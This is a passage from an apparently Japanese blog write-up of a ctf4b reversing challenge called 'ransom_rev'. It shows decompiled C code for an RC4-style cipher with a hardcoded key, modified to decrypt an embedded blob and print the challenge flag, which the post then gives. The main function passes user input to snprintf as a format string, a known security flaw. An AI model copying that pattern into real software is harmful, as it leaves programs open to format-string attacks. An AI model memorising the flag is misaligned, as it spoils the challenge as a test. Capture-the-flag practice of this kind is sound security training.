</span><span class="cp"></span>
<span class="kt">void</span> <span class="nf">random_init</span><span class="p">(</span><span class="kt">int</span> <span class="n">n</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">time_t</span> <span class="n">t</span> <span class="o">=</span> <span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
    <span class="n">srand</span><span class="p">(</span><span class="n">t</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="kt">int</span> <span class="n">r</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
        <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;</span><span class="p">[</span><span class="n">r</span> <span class="o">%</span> <span class="mh">0x3e</span><span class="p">];</span>
    <span class="p">}</span>
    <span class="n">buf</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">swap</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">b</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">tmpc</span> <span class="o">=</span> <span class="o">*</span><span class="n">a</span><span class="p">;</span>
    <span class="o">*</span><span class="n">a</span> <span class="o">=</span> <span class="o">*</span><span class="n">b</span><span class="p">;</span>
    <span class="o">*</span><span class="n">b</span> <span class="o">=</span> <span class="n">tmpc</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">random_set</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">random_buf</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">random_buf_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">random_buf</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x100</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">i</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kt">int</span> <span class="n">l18</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x100</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="kt">int</span> <span class="n">i2</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)(</span><span class="kt">uint8_t</span><span class="p">)</span><span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">l18</span> <span class="o">+</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">random_buf</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">random_buf_len</span><span class="p">];</span>
        <span class="kt">uint32_t</span> <span class="n">u1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)(</span><span class="n">i2</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1f</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mh">0x18</span><span class="p">;</span>
        <span class="n">l18</span> <span class="o">=</span> <span class="p">(</span><span class="n">i2</span> <span class="o">+</span> <span class="n">u1</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">-</span> <span class="n">u1</span><span class="p">;</span>
        <span class="n">swap</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="n">l18</span><span class="p">]);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">encrypt</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">flag_contents</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">crypted_buf</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">flag_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">flag_contents</span><span class="p">);</span>
    <span class="kt">uint32_t</span> <span class="n">l24</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">l20</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">flag_len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">l24</span> <span class="o">=</span> <span class="n">l24</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
        <span class="n">l20</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="p">)</span><span class="n">buf</span><span class="p">[(</span><span class="kt">int</span><span class="p">)</span><span class="n">l24</span><span class="p">]</span> <span class="o">+</span> <span class="n">l20</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
        <span class="n">swap</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">[(</span><span class="kt">int</span><span class="p">)</span><span class="n">l24</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">[(</span><span class="kt">int</span><span class="p">)</span><span class="n">l20</span><span class="p">]);</span>
        <span class="n">crypted_buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">flag_contents</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">buf</span><span class="p">[(</span><span class="kt">uint8_t</span><span class="p">)(</span><span class="n">buf</span><span class="p">[(</span><span class="kt">int</span><span class="p">)</span><span class="n">l20</span><span class="p">]</span> <span class="o">+</span> <span class="n">buf</span><span class="p">[(</span><span class="kt">int</span><span class="p">)</span><span class="n">l24</span><span class="p">])];</span>
        <span class="kt">char</span> <span class="n">lock_file_contents</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&#34;</span><span class="se">\x2b\xa9\xf3\x6f\xa2\x2e\xcd\xf3\x78\xcc\xb7\xa0\xde\x6d\xb1\xd4\x24\x3c\x8a\x89\xa3\xce\xab\x30\x7f\xc2\xb9\x0c\xb9\xf4\xe7\xda\x25\xcd\xfc\x4e\xc7\x9e\x7e\x43\x2b\x3b\xdc\x09\x80\x96\x95\xf6\x76\x10</span><span class="s">&#34;</span><span class="p">;</span>
        <span class="kt">char</span> <span class="n">f</span> <span class="o">=</span> <span class="n">lock_file_contents</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">buf</span><span class="p">[(</span><span class="kt">uint8_t</span><span class="p">)(</span><span class="n">buf</span><span class="p">[(</span><span class="kt">int</span><span class="p">)</span><span class="n">l20</span><span class="p">]</span> <span class="o">+</span> <span class="n">buf</span><span class="p">[(</span><span class="kt">int</span><span class="p">)</span><span class="n">l24</span><span class="p">])];</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%c&#34;</span><span class="p">,</span> <span class="n">f</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">lock_file</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">random_buf</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">flag_contents</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">crypted_buf</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">264</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="n">random_set</span><span class="p">(</span><span class="n">random_buf</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
    <span class="n">encrypt</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">flag_contents</span><span class="p">,</span> <span class="n">crypted_buf</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;usage: ./ransom_rev &lt;flag&gt;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">input_flag</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">random_buf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x11</span><span class="p">);</span>

    <span class="c1">// random_init(0x10, random_buf);
</span><span class="c1"></span>
    <span class="n">random_buf</span> <span class="o">=</span> <span class="s">&#34;rgUAvvyfyApNPEYg&#34;</span><span class="p">;</span>

    <span class="kt">char</span> <span class="n">flag_contents</span><span class="p">[</span><span class="mi">264</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="n">snprintf</span><span class="p">(</span><span class="n">flag_contents</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="n">input_flag</span><span class="p">);</span>

    <span class="kt">int</span> <span class="n">flag_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">flag_contents</span><span class="p">);</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">crypted_buf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">flag_len</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">);</span>
    <span class="n">lock_file</span><span class="p">(</span><span class="n">random_buf</span><span class="p">,</span> <span class="n">flag_contents</span><span class="p">,</span> <span class="n">crypted_buf</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">flag_len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\\</span><span class="s">x%02x&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="p">)</span><span class="n">crypted_buf</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p><code>encrypt</code> 内部で暗号化データをもう一回同じXORをとって復号してprintfしてやると、次のフラグがゲットできました。</p>
<p><code>ctf4b{rans0mw4re_1s_v4ry_dan9er0u3_s0_b4_c4refu1}</code></p>
<p>ポイントとしては、符号に気を付けることが挙げられます。
Ghidraのbyte型はuint8_tとして処理をしてあげると良いでしょう。</p>
</article>

        </main><footer id="footer" style="text-align: center;">
    <a href="https://forms.gle/Cc3R3fFMCQ9m6Rsr9" target="_blank">コメントはこちら</a>
    </br>
    Copyright © 2022 Totsugekitai
    </br>
    Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a> and <a href="https://github.com/LukasJoswiak/etch"
        target="_blank">etch</a>
</footer></body>
</html>
